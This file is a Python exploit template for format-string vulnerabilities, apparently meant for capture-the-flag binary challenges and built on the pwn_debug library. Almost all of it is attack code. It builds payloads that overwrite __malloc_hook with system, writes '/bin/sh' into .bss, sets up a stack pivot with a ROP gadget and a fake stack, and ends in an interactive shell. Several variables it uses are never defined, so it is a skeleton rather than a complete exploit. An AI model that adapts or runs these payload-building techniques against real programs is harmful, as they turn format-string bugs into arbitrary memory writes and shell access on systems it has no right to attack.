# File: exp.py
# Author: raycp
# Date: 2019-06-10
# Description: template for format string vlun

from pwn_debug import *


pdbg=pwn_debug("./binary")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()

def pwn():
    
    #pdbg.bp([])
    
    ## example of fmtstr_payload
    write_dict={malloc_hook:system_addr,bss_addr:u32('/bin'),bss_addr+4:u32("/sh\x00")}
    payload=pdbg.fmtstr_payload(7,write_dict,"short")
    
    ## example of format_hn_complete
    write_dict={malloc_hook:system_addr,bss_addr:u32('/bin'),bss_addr+4:u32("/sh\x00")}
    payload=pdbg.format_hn_complete(7,write_dict)


    fmt_write={}
    fmt_write[malloc_hook]=stack_povit&0xffff
    fmt_write[malloc_hook+2]=(stack_povit>>16)&0xffff
    fmt_write[fake_rsp]=prdi_ret&0xffff
    fmt_write[fake_rsp+2]=(prdi_ret>>16)&0xffff
    fmt_write[fake_rsp+8]=(fake_rsp+0x18)&0xffff
    fmt_write[fake_rsp+10]=((fake_rsp+0x18)>>16)&0xffff
    fmt_write[fake_rsp+0x10]=read_func&0xffff
    fmt_write[fake_rsp+0x12]=(read_func>>16)&0xfffff

    tmp_payload=pdbg.fmtstr_hn_payload(6,fmt_write)

    tmp_payload+="%%%dc"%(fake_rsp-0x20)

    padlen=8-(len(tmp_payload)%8)
    padlen+=0x8
    tmp_payload+='a'*padlen
    payload_len=len(tmp_payload)

    index=payload_len/8
    payload=pdbg.fmtstr_hn_payload(6+index,fmt_write)
    payload+="%%%dc"%(fake_rsp-0x20)
    payload=payload.ljust(payload_len,'a')
    for where,what in fmt_write.items():
        payload+=p64(where)
    

    p.interactive() 

if __name__ == '__main__':
    pwn()


